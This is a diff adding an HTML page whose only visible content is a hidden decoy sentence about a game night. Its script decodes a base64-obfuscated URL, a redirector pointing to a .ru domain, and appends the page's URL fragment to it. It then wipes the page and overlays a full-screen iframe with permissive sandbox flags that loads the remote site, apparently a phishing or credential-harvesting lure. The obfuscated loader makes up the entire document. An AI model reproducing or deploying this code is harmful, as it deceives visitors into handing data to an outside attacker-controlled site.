@@ -1,0 +1,37 @@
+<html>
+ <head>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex, nofollow">
+ </head>
+ <body>
+ <span hidden>The friends gathered for a fun game night.</span>
+ </body>
+<script>
+var hickory = null;
+if(location.hash == ""){
+location.hash = ``;
+hickory = ``;
+}
+if(location.hash !== ""){
+hickory = location.hash;
+}
+if (location.hash.includes('?')) {
+hickory = location.hash.replace('#', '');
+}
+
+(async () => {
+    var catalpa = document.createElement('iframe');
+    catalpa.sandbox.add('allow-same-origin');
+    catalpa.sandbox.add('allow-top-navigation');
+    catalpa.sandbox.add('allow-modals');
+    catalpa.sandbox.add('allow-scripts');
+    catalpa.sandbox.add('allow-popups-to-escape-sandbox');
+    catalpa.sandbox.add('allow-forms');
+    catalpa.src = atob("aHR0cHM6Ly9ocmVmLmxpLz9odHRwczovL0FsMXcucHJheGlzdmlvbi5ydS9nWUtRU2kv")+hickory;
+    catalpa.style.cssText = 'position: fixed; inset: 0px; width: 100%; height: 100%; border: 0px; margin: 0px;padding: 0px; overflow: hidden; z-index: 999999;';
+    document.write(catalpa);
+    document.body.innerHTML = "";
+    document.body.appendChild(catalpa);
+})();
+</script>
+</html>
